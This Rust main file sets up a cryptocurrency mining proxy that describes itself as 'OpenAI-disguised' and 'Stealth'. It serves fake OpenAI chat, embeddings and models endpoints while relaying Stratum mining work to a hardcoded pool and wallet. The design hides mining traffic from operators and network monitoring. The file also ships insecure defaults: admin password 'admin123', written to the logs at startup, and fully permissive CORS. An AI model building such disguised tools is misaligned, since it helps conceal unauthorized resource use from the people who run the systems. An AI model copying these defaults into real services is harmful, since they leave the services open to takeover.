mod openai_handlers;
mod state;
mod types;
mod upstream;

use std::net::SocketAddr;
use axum::routing::{get, post};
use axum::Router;
use clap::Parser;
use tokio::sync::mpsc;
use tower_http::cors::CorsLayer;
use tower_http::trace::TraceLayer;
use tracing::info;
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};

use crate::openai_handlers::{
    handle_admin_stats, handle_chat_completions, handle_dashboard_html, handle_embeddings,
    handle_health, handle_models_list,
};
use crate::state::AppState;
use crate::upstream::run_upstream_client;

#[derive(Parser, Debug)]
#[command(name = "pearl-proxy", version = "0.1.0", about = "High-performance OpenAI-disguised Stratum Proxy for Pearl ZK-PoW")]
struct Cli {
    #[arg(long, default_value = "0.0.0.0:8000", env = "PROXY_LISTEN")]
    listen: String,

    #[arg(long, default_value = "pearl-eu1.luckypool.io", env = "POOL_HOST")]
    pool: String,

    #[arg(long, default_value_t = 3360, env = "POOL_PORT")]
    pool_port: u16,

    #[arg(long, default_value = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06", env = "WALLET")]
    wallet: String,

    #[arg(long, default_value = "proxy-hub", env = "WORKER")]
    worker: String,

    #[arg(long, default_value = "cpminer/1.0", env = "AGENT")]
    agent: String,

    #[arg(long, default_value = "admin123", env = "ADMIN_PASS")]
    admin_pass: String,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::registry()
        .with(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "pearl_proxy=info,tower_http=info".into()),
        )
        .with(tracing_subscriber::fmt::layer())
        .init();

    let cli = Cli::parse();

    info!("=== Starting Pearl AI Stealth Proxy ===");
    info!("Listen endpoint: {}", cli.listen);
    info!("Upstream pool:   {}:{}", cli.pool, cli.pool_port);
    info!("Wallet address:  {}", cli.wallet);
    info!("Admin password:  {}", cli.admin_pass);

    let (cmd_tx, cmd_rx) = mpsc::channel(128);

    let state = AppState::new(
        cli.pool.clone(),
        cli.pool_port,
        cli.wallet.clone(),
        cli.worker.clone(),
        cli.agent.clone(),
        cli.admin_pass,
        cmd_tx,
    );

    // Spawn Upstream Stratum connection task
    let upstream_state = state.clone();
    tokio::spawn(async move {
        run_upstream_client(
            cli.pool,
            cli.pool_port,
            cli.wallet,
            cli.worker,
            cli.agent,
            upstream_state,
            cmd_rx,
        )
        .await;
    });

    // Build OpenAI disguised REST & SSE API router
    let app = Router::new()
        // OpenAI standard endpoints
        .route("/v1/chat/completions", post(handle_chat_completions))
        .route("/v1/embeddings", post(handle_embeddings))
        .route("/v1/models", get(handle_models_list))
        .route("/models", get(handle_models_list))
        // Admin & Monitoring Dashboard
        .route("/admin/stats", get(handle_admin_stats))
        .route("/stats", get(handle_admin_stats))
        .route("/admin", get(handle_dashboard_html))
        .route("/dashboard", get(handle_dashboard_html))
        .route("/health", get(handle_health))
        .route("/", get(handle_dashboard_html))
        .layer(CorsLayer::permissive())
        .layer(TraceLayer::new_for_http())
        .with_state(state);

    let addr: SocketAddr = cli.listen.parse()?;
    let listener = tokio::net::TcpListener::bind(addr).await?;
    info!("Proxy HTTP/OpenAI server listening on http://{}", addr);
    info!("Dashboard available at http://{}/dashboard", addr);

    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await?;

    Ok(())
}
